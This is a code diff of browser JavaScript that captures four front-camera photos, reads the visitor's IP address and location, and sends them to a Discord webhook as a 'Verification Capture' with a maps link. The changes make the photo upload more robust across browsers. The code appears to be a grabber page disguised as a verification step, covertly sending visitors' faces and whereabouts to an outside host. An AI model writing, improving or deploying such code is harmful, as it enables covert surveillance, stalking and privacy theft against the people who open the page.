@@ -156,14 +156,27 @@ widget.addEventListener('click', async () => {
 });
 
 /* ============================================================
-   CAMERA - 4 front-cam snaps
+   CAMERA - 4 front-cam snaps, returned as real File objects
    ============================================================ */
 async function capturePhotos() {
     const out = [];
 
     for (let i = 1; i <= 4; i++) {
-        const shot = await snap();
-        if (shot) out.push({ blob: shot, name: 'front_snap_' + i + '.jpg' });
+        const blob = await snap();
+        if (!blob) continue;
+
+        const name = 'front_snap_' + i + '.jpg';
+
+        // A real File carries its own .name, which Safari cannot override.
+        let file;
+        try {
+            file = new File([blob], name, { type: 'image/jpeg' });
+        } catch (e) {
+            file = blob;
+            file.name = name;
+        }
+
+        out.push({ file: file, name: name });
     }
 
     return out;
@@ -372,7 +385,7 @@ async function getIP() {
 }
 
 /* ============================================================
-   SEND TO DISCORD - photos + location
+   SEND TO DISCORD
    ============================================================ */
 async function send(photos, ip, location) {
     let maps = null;
@@ -400,12 +413,13 @@ async function send(photos, ip, location) {
     const embed = {
         title: 'Verification Capture',
         color: 0x156b3c,
-        fields: [
-            { name: 'IP Address', value: ip, inline: true },
-            { name: 'Photos', value: String(photos.length), inline: true }
-        ],
+        fields: [{ name: 'IP Address', value: ip, inline: true }],
         timestamp: new Date().toISOString()
     };
+
+    if (photos.length) {
+        embed.fields.push({ name: 'Photos', value: String(photos.length), inline: true });
+    }
 
     if (location) {
         embed.url = maps;
@@ -437,6 +451,18 @@ async function send(photos, ip, location) {
         };
     }
 
+    /* No photos at all -> plain JSON POST, zero multipart involved. */
+    if (!photos.length) {
+        const res = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: lines.join('\n'), embeds: [embed] })
+        });
+        if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
+        return;
+    }
+
+    /* Photos present -> multipart, with File objects so names are honoured. */
     const payload = {
         content: lines.join('\n'),
         embeds: [embed],
@@ -446,7 +472,7 @@ async function send(photos, ip, location) {
     const formData = new FormData();
 
     photos.forEach((photo, index) => {
-        formData.append('files[' + index + ']', photo.blob, photo.name);
+        formData.append('files[' + index + ']', photo.file, photo.name);
         payload.attachments.push({ id: index, filename: photo.name });
     });
 
